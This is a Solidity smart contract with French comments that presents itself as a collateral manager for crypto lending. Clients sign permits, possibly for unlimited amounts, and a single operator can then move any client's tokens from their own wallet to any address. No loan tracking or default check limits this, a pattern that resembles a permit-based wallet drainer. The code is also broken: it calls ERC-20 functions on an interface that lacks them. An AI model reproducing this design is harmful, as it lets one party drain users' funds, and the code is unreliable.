// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Permit.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

/**
 * @title CollateralManager
 * @dev Gère les collatéraux pour un système de prêt crypto
 * Permet aux clients de signer un Permit pour autoriser le retrait de collatéraux
 */
contract CollateralManager is Ownable, ReentrancyGuard {
    IERC20Permit public immutable token;
    address public operator;

    // Mapping pour suivre les clients enregistrés
    mapping(address => bool) public registeredClients;
    mapping(address => uint256) public clientAllowance;

    // Events
    event ClientRegistered(address indexed client, uint256 allowance, uint256 timestamp);
    event CollateralWithdrawn(address indexed client, address indexed to, uint256 amount, string reason);
    event OperatorChanged(address indexed oldOperator, address indexed newOperator);

    modifier onlyOperator() {
        require(msg.sender == operator, "Only operator can call this");
        _;
    }

    constructor(address _token) Ownable(msg.sender) {
        require(_token != address(0), "Invalid token address");
        token = IERC20Permit(_token);
        operator = msg.sender;
    }

    /**
     * @dev Change l'adresse de l'opérateur autorisé à retirer les collatéraux
     */
    function setOperator(address _operator) external onlyOwner {
        require(_operator != address(0), "Invalid operator address");
        address oldOperator = operator;
        operator = _operator;
        emit OperatorChanged(oldOperator, _operator);
    }

    /**
     * @dev Enregistre un client avec un Permit signé
     * @param owner Adresse du client (propriétaire des tokens)
     * @param value Montant autorisé (peut être type(uint256).max pour illimité)
     * @param deadline Timestamp d'expiration du permit
     * @param v, r, s Composants de la signature EIP-712
     */
    function registerClientWithPermit(
        address owner,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external nonReentrant {
        require(owner != address(0), "Invalid owner address");
        
        // Appel de la fonction permit du token ERC-20
        token.permit(owner, address(this), value, deadline, v, r, s);
        
        // Enregistrement du client
        registeredClients[owner] = true;
        clientAllowance[owner] = value;
        
        emit ClientRegistered(owner, value, block.timestamp);
    }

    /**
     * @dev Permet à l'opérateur de retirer les collatéraux d'un client
     * @param client Adresse du client
     * @param to Adresse de destination des fonds
     * @param amount Montant à retirer
     * @param reason Raison du retrait (ex: "Non-paiement prêt #123")
     */
    function withdrawCollateral(
        address client,
        address to,
        uint256 amount,
        string calldata reason
    ) external onlyOperator nonReentrant {
        require(registeredClients[client], "Client not registered");
        require(to != address(0), "Invalid destination address");
        require(amount > 0, "Amount must be greater than 0");
        
        // Vérifier l'allowance actuelle
        uint256 currentAllowance = token.allowance(client, address(this));
        require(currentAllowance >= amount, "Insufficient allowance");
        
        // Vérifier le solde du client
        uint256 clientBalance = token.balanceOf(client);
        require(clientBalance >= amount, "Insufficient client balance");
        
        // Retrait des fonds
        bool success = token.transferFrom(client, to, amount);
        require(success, "Transfer failed");
        
        emit CollateralWithdrawn(client, to, amount, reason);
    }

    /**
     * @dev Vérifie l'allowance actuelle d'un client
     */
    function getClientAllowance(address client) external view returns (uint256) {
        return token.allowance(client, address(this));
    }

    /**
     * @dev Vérifie le solde d'un client
     */
    function getClientBalance(address client) external view returns (uint256) {
        return token.balanceOf(client);
    }

    /**
     * @dev Vérifie si un client est enregistré
     */
    function isClientRegistered(address client) external view returns (bool) {
        return registeredClients[client];
    }
}
